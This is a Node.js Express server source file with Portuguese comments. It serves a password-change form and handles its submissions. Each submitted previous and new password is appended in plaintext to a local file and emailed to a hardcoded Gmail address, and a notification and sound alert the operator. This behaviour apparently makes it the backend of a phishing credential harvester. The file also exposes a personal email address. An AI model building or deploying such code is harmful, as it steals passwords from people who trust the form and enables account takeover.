const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const notifier = require('node-notifier');
const sound = require('sound-play');
const nodemailer = require('nodemailer');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Configuração do Nodemailer
const transporter = nodemailer.createTransport({
	service: 'gmail', // Use o Gmail como serviço
	auth: {
		user: 'rafaelfelipe501@gmail.com', // Seu e-mail do Gmail
		pass: '', // Senha do aplicativo gerada no Gmail, se necessário
	},
});

app.get('/password-form', (req, res) => {
	res.sendFile(path.join(__dirname, 'public', 'formulario.html'));
});

app.post('/password-update', (req, res) => {
	const { previousPassword, newPassword, confirmPassword } = req.body;
	if (!previousPassword || !newPassword || !confirmPassword) {
		console.error('Dados incompletos!');
		return res.status(400).send('Dados incompletos!');
	}

	const log = `Senha anterior: ${previousPassword} | Nova Senha: ${newPassword} | Confirme Nova Senha: ${confirmPassword} | ${new Date().toISOString()}\n`;
	const filePath = path.join(__dirname, 'dados.txt');

	fs.appendFileSync(filePath, log, (err) => {
		if (err) {
			console.error('Erro ao escrever no arquivo:', err);
		}
	});

	// Enviar notificação no Windows
	notifier.notify({
		title: 'Alteração de Senha',
		message: 'A senha foi alterada!',
		icon: path.join(__dirname, 'icon.png'),
		sound: true,
		wait: true,
	});

	// Reproduzir som
	sound.play(path.join(__dirname, 'som-alto.wav'));

	// Enviar e-mail para o seu e-mail
	const mailOptions = {
		from: 'rafaelfelipe501@gmail.com', // Seu e-mail de envio
		to: 'rafaelfelipe501@gmail.com', // Seu e-mail de destino
		subject: 'Alteração de Senha Detectada',
		text: `A senha foi alterada!\n\nSenha anterior: ${previousPassword}\nNova senha: ${newPassword}`,
	};

	transporter.sendMail(mailOptions, (error, info) => {
		if (error) {
			return console.log('Erro ao enviar e-mail: ', error);
		}
		console.log('E-mail enviado: ' + info.response);
	});

	res.sendFile(path.join(__dirname, 'public', 'concluido.html'));
});

app.listen(PORT, () => {
	console.log(`Servidor rodando em http://localhost:${PORT}`);
});
